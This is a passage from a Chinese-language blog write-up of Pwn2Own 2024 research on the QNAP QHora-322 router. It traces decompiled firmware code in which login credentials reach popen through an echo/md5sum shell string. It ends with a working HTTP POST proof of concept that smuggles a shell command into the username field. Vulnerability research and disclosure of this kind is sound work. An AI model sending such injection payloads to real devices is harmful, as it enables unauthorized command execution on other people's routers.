class="keyword">if</span> ((iVar2 == <span class="number">0</span>) || (local_1b28 == <span class="number">0</span>)) &#123;</span><br><span class="line">      puVar5 = &amp;DAT_00144148;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      puVar5 = (undefined *)<span class="built_in">json_object_get_string</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">qnap_log</span>(<span class="number">3</span>,&amp;DAT_<span class="number">00143e42</span>,<span class="string">&quot;qid/qcloud_auth.c&quot;</span>,<span class="number">599</span>,<span class="string">&quot;qnap_id_auth_user&quot;</span>,<span class="string">&quot;code: %d msg: %s&quot;</span>,iVar1,</span><br><span class="line">             puVar5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">json_object_put</span>(lVar3);</span><br><span class="line">  <span class="keyword">return</span> iVar1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>继续跟<code>qnap_id_get_signin_token_cache</code></p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">undefined8</span><br><span class="line"><span class="title function_">qnap_id_get_signin_token_cache</span></span><br><span class="line">          <span class="params">(undefined8 param_1,undefined8 param_2,undefined8 strpwd,undefined8 usern,</span></span><br><span class="line"><span class="params">          undefined8 passowrd,<span class="type">long</span> param_6)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">time_t</span> tVar2;</span><br><span class="line">  undefined8 local_810;</span><br><span class="line">  undefined8 uStack_808;</span><br><span class="line">  undefined auStack_800 [<span class="number">1016</span>];</span><br><span class="line">  undefined8 local_408;</span><br><span class="line">  undefined8 uStack_400;</span><br><span class="line">  undefined auStack_3f8 [<span class="number">1016</span>];</span><br><span class="line">  </span><br><span class="line">  local_810 = <span class="number">0</span>;</span><br><span class="line">  uStack_808 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(auStack_800,<span class="number">0</span>,<span class="number">0x3f1</span>);</span><br><span class="line">  local_408 = <span class="number">0</span>;</span><br><span class="line">  uStack_400 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(auStack_3f8,<span class="number">0</span>,<span class="number">0x3f1</span>);</span><br><span class="line">  qnap_id_get_signin_token_cache_section_name</span><br><span class="line">            (param_1,param_2,strpwd,usern,passowrd,&amp;local_810,<span class="number">0x400</span>);<span class="comment">//[1]</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">char</span>)local_810 != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">    iVar1 = qid_sys_get_access_token_expire_time(&amp;local_810);</span><br><span class="line">    tVar2 = time((<span class="type">time_t</span> *)<span class="number">0x0</span>);</span><br><span class="line">    <span class="keyword">if</span> (tVar2 &lt;= iVar1) &#123;</span><br><span class="line">      qid_sys_get_access_token(&amp;local_810,<span class="string">&quot;AccessToken&quot;</span>,param_6,<span class="number">0x101</span>);</span><br><span class="line">      qid_sys_get_access_token(&amp;local_810,<span class="string">&quot;TokenType&quot;</span>,param_6 + <span class="number">0x101</span>);</span><br><span class="line">      qid_sys_get_access_token(&amp;local_810,<span class="string">&quot;ExpiresIn&quot;</span>,&amp;local_408,<span class="number">0x400</span>);</span><br><span class="line">      iVar1 = atoi((<span class="type">char</span> *)&amp;local_408);</span><br><span class="line">      *(<span class="type">int</span> *)(param_6 + <span class="number">0x204</span>) = iVar1;</span><br><span class="line">      qid_sys_get_access_token(&amp;local_810,<span class="string">&quot;RefreshToken&quot;</span>,param_6 + <span class="number">0x208</span>,<span class="number">0x101</span>);</span><br><span class="line">      qid_sys_get_access_token(&amp;local_810,<span class="string">&quot;Scope&quot;</span>,param_6 + <span class="number">0x309</span>,<span class="number">0x1001</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xfffffc1d</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">qnap_id_get_signin_token_cache_section_name</span></span></span><br><span class="line"><span class="function">              <span class="params">(undefined8 param_1,undefined8 param_2,<span class="type">char</span> *strpwd,undefined8 user,undefined8 passwd,</span></span></span><br><span class="line"><span class="params"><span class="function">              <span class="type">char</span> *param_6,<span class="type">size_t</span> num_400)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">char</span> *__format;</span><br><span class="line">  undefined8 local_810;</span><br><span class="line">  undefined8 uStack_808;</span><br><span class="line">  undefined auStack_800 [<span class="number">1016</span>];</span><br><span class="line">  undefined8 local_408;</span><br><span class="line">  undefined8 uStack_400;</span><br><span class="line">  undefined auStack_3f8 [<span class="number">1016</span>];</span><br><span class="line">  </span><br><span class="line">  local_810 = <span class="number">0</span>;</span><br><span class="line">  uStack_808 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(auStack_800,<span class="number">0</span>,<span class="number">0x3f1</span>);</span><br><span class="line">  local_408 = <span class="number">0</span>;</span><br><span class="line">  uStack_400 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(auStack_3f8,<span class="number">0</span>,<span class="number">0x3f1</span>);</span><br><span class="line">  iVar1 = <span class="built_in">strcasecmp</span>(strpwd,<span class="string">&quot;password&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>((<span class="type">char</span> *)&amp;local_810,<span class="number">0x400</span>,<span class="string">&quot;%s%s%s%s&quot;</span>,param_1,param_2,user,passwd);</span><br><span class="line">    <span class="built_in">util_get_md5_digest</span>(&amp;local_810,&amp;local_408,<span class="number">0x400</span>);<span class="comment">//[2]</span></span><br><span class="line">    __format = <span class="string">&quot;auth-password-%s&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    iVar1 = <span class="built_in">strcasecmp</span>(strpwd,<span class="string">&quot;client_credentials&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> iVar1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">snprintf</span>((<span class="type">char</span> *)&amp;local_810,<span class="number">0x400</span>,<span class="string">&quot;%s%s&quot;</span>,param_1,param_2);</span><br><span class="line">    <span class="built_in">util_get_md5_digest</span>(&amp;local_810,&amp;local_408,<span class="number">0x400</span>);</span><br><span class="line">    __format = <span class="string">&quot;auth-client_credentials-%s&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = <span class="built_in">snprintf</span>(param_6,num_400,__format,&amp;local_408);</span><br><span class="line">  <span class="keyword">return</span> iVar1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">util_get_md5_digest</span><span class="params">(undefined8 param_1,undefined8 param_2,undefined8 param_3)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> acStack_208 [<span class="number">520</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">snprintf</span>(acStack_208,<span class="number">0x200</span>,<span class="string">&quot;/bin/echo -n %s | /usr/bin/md5sum | cut -d\&quot; \&quot; -f1&quot;</span>,param_1);</span><br><span class="line">  <span class="built_in">util_system_cmd</span>(acStack_208,param_2,param_3);<span class="comment">//[3]</span></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>一路跟下去</p>
</blockquote>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">undefined8</span></span><br><span class="line"><span class="function"><span class="title">util_system_cmd_ex</span><span class="params">(<span class="type">char</span> *param_1,<span class="type">char</span> *param_2,<span class="type">size_t</span> param_3,<span class="type">int</span> *param_4,<span class="type">long</span> param_5,<span class="type">int</span> param_6)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint uVar1;</span><br><span class="line">  uint uVar2;</span><br><span class="line">  <span class="type">int</span> iVar3;</span><br><span class="line">  FILE *__stream;</span><br><span class="line">  fd_set *__readfds;</span><br><span class="line">  <span class="type">int</span> *piVar4;</span><br><span class="line">  <span class="type">char</span> *pcVar5;</span><br><span class="line">  timeval local_498;</span><br><span class="line">  undefined auStack_488 [<span class="number">128</span>];</span><br><span class="line">  <span class="type">char</span> acStack_408 [<span class="number">1032</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ((param_1 == (<span class="type">char</span> *)<span class="number">0x0</span> || param_2 == (<span class="type">char</span> *)<span class="number">0x0</span>) || (param_3 == <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="built_in">qnap_log</span>(<span class="number">3</span>,&amp;DAT_<span class="number">00143e42</span>,<span class="string">&quot;utils/util.c&quot;</span>,<span class="number">0x3a1</span>,<span class="string">&quot;util_system_cmd_ex&quot;</span>,<span class="string">&quot;invalid parameters&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xfffffc39</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(param_2,<span class="number">0</span>,param_3);</span><br><span class="line">  __stream = <span class="built_in">popen</span>(param_1,<span class="string">&quot;r&quot;</span>); <span class="comment">//[1]</span></span><br><span class="line">  <span class="keyword">if</span> (__stream == (FILE *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    piVar4 = __errno_location();</span><br><span class="line">    pcVar5 = <span class="built_in">strerror</span>(*piVar4);</span><br><span class="line">    <span class="built_in">qnap_log</span>(<span class="number">3</span>,&amp;DAT_<span class="number">00143e42</span>,<span class="string">&quot;utils/util.c&quot;</span>,<span class="number">0x3d9</span>,<span class="string">&quot;util_system_cmd_ex&quot;</span>,</span><br><span class="line">             <span class="string">&quot;popen failed: cmd: %s: err: %s&quot;</span>,param_1,pcVar5);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> &lt; param_6) &#123;</span><br><span class="line">    uVar2 = <span class="built_in">fileno</span>(__stream);</span><br><span class="line">    local_<span class="number">498.</span>tv_usec = <span class="number">0</span>;</span><br><span class="line">    local_<span class="number">498.</span>tv_sec = (<span class="type">long</span>)param_6;</span><br><span class="line">    __readfds = (fd_set *)<span class="built_in">memset</span>(auStack_488,<span class="number">0</span>,<span class="number">0x80</span>);</span><br><span class="line">    uVar1 = uVar2 &amp; <span class="number">0x3f</span>;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">int</span>)uVar2 &lt; <span class="number">1</span>) &#123;</span><br><span class="line">      uVar1 = -(-uVar2 &amp; <span class="number">0x3f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    __readfds-&gt;fds_bits[(<span class="type">int</span>)uVar2 / <span class="number">0x40</span>] = <span class="number">1L</span> &lt;&lt; ((ulong)uVar1 &amp; <span class="number">0x3f</span>);</span><br><span class="line">    iVar3 = <span class="built_in">select</span>(uVar2 + <span class="number">1</span>,__readfds,(fd_set *)<span class="number">0x0</span>,(fd_set *)<span class="number">0x0</span>,&amp;local_498);</span><br><span class="line">    <span class="keyword">if</span> (iVar3 != <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (param_5 != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(acStack_408,<span class="number">0x400</span>,<span class="string">&quot;/usr/bin/killall -9 %s&quot;</span>,param_5);</span><br><span class="line">        <span class="built_in">system</span>(acStack_408);</span><br><span class="line">      &#125;</span><br><span class="line">      piVar4 = __errno_location();</span><br><span class="line">      pcVar5 = <span class="built_in">strerror</span>(*piVar4);</span><br><span class="line">      <span class="built_in">qnap_log</span>(<span class="number">3</span>,&amp;DAT_<span class="number">00143e42</span>,<span class="string">&quot;utils/util.c&quot;</span>,<span class="number">0x3c2</span>,<span class="string">&quot;util_system_cmd_ex&quot;</span>,</span><br><span class="line">               <span class="string">&quot;read process output timeout: cmd: %s: err: %s&quot;</span>,param_1,pcVar5);</span><br><span class="line">      <span class="keyword">goto</span> LAB_0011ab58;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fgets</span>(param_2,(<span class="type">int</span>)param_3,__stream);</span><br><span class="line">LAB_0011ab58:</span><br><span class="line">  <span class="keyword">if</span> (param_4 == (<span class="type">int</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    <span class="built_in">pclose</span>(__stream);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    iVar3 = <span class="built_in">pclose</span>(__stream);</span><br><span class="line">    *param_4 = iVar3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">util_strip</span>(param_2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>最后在<code>util_system_cmd_ex</code>中使用<code>popen</code>执行了命令造成了命令注入, 造成注入的原因是在生成md5加密的的值时, 将用户名和密码直接使用echo和md5sum命令,并且使用popen去执行.(已验证)</p>
</blockquote>
<blockquote>
<p>回到我上面说的判断, 由于没有实体设备测试，但初步确认是绑定qnap id并设置设备名称时会使用<code>qid_sys_set_qid_status</code>函数,默认设置为3，一般在设置设备时候使用<code>qcloud_control_tool bind * *</code> 去设置，只要配置不爆错一般是能够成功设置qid的状态的。(所以我初步认为只要设备绑定了qnapid和设备名称就可以造成命令注入，poc中需要将<code>qid_login</code>设置为<code>true</code>), 并且qnap会强烈的建议您使用他们的云服务, 基本上所有的设备都会去绑定, 以下是POC.</p>
</blockquote>
<div class="code-container" data-rel="Https"><figure class="iseeu highlight https"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/miro/api/v1/login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.199.221</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>113</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">baggage</span><span class="punctuation">: </span>sentry-environment=production,sentry-public_key=cd1cc31d0e574fb20f9153041f7ed837,sentry-trace_id=9dc990816a5e49b9a04d0d7c9da7625f</span><br><span class="line"><span class="attribute">authorization</span><span class="punctuation">: </span>Bearer undefined</span><br><span class="line"><span class="attribute">sentry-trace</span><span class="punctuation">: </span>9dc990816a5e49b9a04d0d7c9da7625f-a99747e4fccdd528</span><br><span class="line"><span class="attribute">content-type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.199.221</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.199.221/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>len=null</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-bash">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;Zh<span class="subst">$(id &gt; /superpoc)</span>iy&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;YXNkYWRhZGE=&quot;</span>,<span class="string">&quot;force&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;remember_me&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;qid_login&quot;</span>:<span class="literal">true</span>&#125;</span></span><br><span class="line"><span class="language-bash"></span></span><br></pre></td></tr></table></figure></div>

<h2 id="The-End"><a href="#The-End" class="headerlink" title="The End"></a>The End</h2><blockquote>
<p>而在我写完这个文章时候今年的Pwn2Own还没有开始, 所以您如果在比赛前看到这个文章就说明在比赛之前的固件更新中修复了漏洞, 不然这个文章将在Pwn2Own比赛结束后出现.</p>
</blockquote>
<blockquote>
<p>现在这个时间我正在挖掘下一个目标，而在我为了搞清楚这个目标的功能抓耳挠腮时，qnap发布了足足四个更新，而我测试的版本是2.4.1.634 build 20240710，我完全相信qnap能够完全修补这些问题。</p>
</blockquote>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Pwn2Own-2024-QHora-322</li>
        <li><strong>Author:</strong> Zhiyuan</li>
        <li><strong>Created at
                :</strong> 2024-11-11 22:43:43</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-05-17 14:25:26
            </li>
        
        <li>
            <strong>Link:</strong> https://redefine.ohevan.com/2024/11/11/Pwn2Own-2024-QHora-322/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/IoT/">#IoT</a>&nbsp;
			</li>
			
			<li class="tag-item mx-0.5">
				<a href="/tags/Vulnerability/">#Vulnerability</a>&nbsp;
			</li>
			
			<li class="tag-item mx-0.5">
				<a href="/tags/Qnap/">#Qnap</a>&nbsp;
			</li>
			
			<li class="tag-item mx-0.5">
				<a href="/tags/Pwn2Own/">#Pwn2Own</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/03/28/Secgate-3600-RCE/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">奇安信网神Secgate3600防火墙认证绕过+RCE</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2024/07/29/Uniview-NVR-RCE/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">Uniview NVR command injection</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="waline"></div>
    <script type="module" data-swup-reload-script>
      import { init } from '/js/libs/waline.mjs';

      function loadWaline() {
        init({
          el: '#waline',
          serverURL: 'https://example.example.com',
          lang: 'zh-CN',
          dark: 'body[class~="dark-mode"]',
          reaction: false,
          requiredMeta: ['nick', 'mail'],
          emoji: [],
          
          
        });
      }

      if (typeof swup !== 'undefined') {
        loadWaline();
      } else {
        window.addEventListener('DOMContentLoaded', loadWaline);
      }
    </script>



        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">Pwn2Own-2024-QHora-322</div>
		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%BA%E4%BB%B6%E7%9A%84%E6%8F%90%E5%8F%96"><span class="nav-text">固件的提取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BE%E5%A4%87%E6%94%BB%E5%87%BB%E9%9D%A2%E6%A2%B3%E7%90%86"><span class="nav-text">设备攻击面梳理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%80%E6%94%BE%E7%9A%84%E7%AB%AF%E5%8F%A3"><span class="nav-text">开放的端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web%E6%9C%8D%E5%8A%A1-webframework"><span class="nav-text">web服务-webframework</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#systemd-resolved-%E6%9C%8D%E5%8A%A1-5355%E7%AB%AF%E5%8F%A3"><span class="nav-text">systemd-resolved 服务 5355端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#charon-%E6%9C%8D%E5%8A%A1-4500-500%E7%AB%AF%E5%8F%A3"><span class="nav-text">charon 服务 4500,500端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dm-agent%E6%9C%8D%E5%8A%A1-%E5%BC%80%E6%94%BE%E4%BA%86%E8%AE%B8%E5%A4%9A%E7%AB%AF%E5%8F%A3"><span class="nav-text">dm_agent服务 开放了许多端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bcclient-Qfinder%E7%9A%84%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="nav-text">bcclient Qfinder的服务端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8099-python"><span class="nav-text">8099-python</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#quwan-wmd-7788"><span class="nav-text">quwan_wmd-7788</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#qthd-4433"><span class="nav-text">qthd-4433</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#qs-call%E5%92%8C%E6%80%BB%E7%BB%93"><span class="nav-text">qs_call和总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#vuln-1"><span class="nav-text">vuln-1 ?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vuln-2"><span class="nav-text">vuln-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vuln-3"><span class="nav-text">vuln-3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#The-End"><span class="nav-text">The End</span></a></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2022</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Zhiyuan</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        6 posts in total
                    </span>
                    
                </p>
            
        </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
        </div>
        
        
            <div>
